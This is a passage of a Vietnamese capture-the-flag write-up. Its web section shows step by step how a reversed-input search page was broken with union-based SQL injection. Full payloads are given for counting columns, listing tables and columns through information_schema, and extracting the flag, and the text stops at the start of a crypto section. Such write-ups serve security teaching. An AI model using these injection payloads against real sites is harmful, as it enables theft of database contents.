# I. Web2
* Đề bài cho ta một trang web cho phép tìm kiếm thông tin thông qua tên đã bị đảo ngược (Reverse of name). Có thể đảo ngược bằng tool trên [kt.gy](https://kt.gy/tools.html#conv/).

* Trang web hiển thị là "LQS search" và đề bài nhắc đến "Đảo ngược" (Reverse) nên khả năng cao database được sử dụng ở đây là SQL.

![img](https://github.com/dnamgithub33/wu_svattt/blob/3f064232249fb035d4b0ae225391b5d1829192f2/img/homew2.PNG)

* Thử lệnh ```' ODER BY 1-- -``` hoặc ```' UNION SELECT NULL,NULL,NULL-- -``` để kiểm tra số lượng cột mà câu lệnh truy xuất ra với ```-- -``` là comment loại bỏ các câu lệnh đằng sau (SQL injection), ```1``` là số lượng cột mà trang truy vấn, tăng dần lên tới ```3```, ta biết được nó truy xuất ra 3 cột, lớn hơn thì câu lệnh bị lỗi.

![img](https://github.com/dnamgithub33/wu_svattt/blob/fc0f4da1a6435d589a4e3c2abe5c0bbfcff5d5b3/img/img.png)

* Đã biết được câu lệnh truy vấn 3 cột, có thể còn nhiều bảng khác chưa được truy vấn ra, sử dụng câu lệnh ```' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -``` và tìm được bảng ```flag```.

![img](https://github.com/dnamgithub33/wu_svattt/blob/8d05ccaafc84ba837f853e175be5a674a2e4f91a/img/flag_table.PNG)

* Tiếp tục tìm tất cả các cột trong bảng ```flag``` bằng lệnh ```' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='flag'-- -``` và tìm ra cột ```flag```.

![img](https://github.com/dnamgithub33/wu_svattt/blob/04f497a7f1b4f03bd581bb728da75286bdc4e25f/img/flag.PNG)

* Đã biết cột và bảng có thể chứa flag rồi ta dùng lệnh ```' UNION SELECT NULL,flag,NULL FROM flag-- -``` để truy xuất nội dung trong cột ```flag``` và có flag.

![img](https://github.com/dnamgithub33/wu_svattt/blob/62bce02ea70bb0607ff88cf6fb5113ac3f3d6616/img/final_flag.PNG)

Flag:```ATTT{4_51mpl3_r3v_5ql}```.

**Lưu ý:** _mỗi câu lệnh ở trên đều phải đảo ngược lại mới có thể truy xuất._ 

# II. Crypto1
* Đề bài cho ta 2 file 


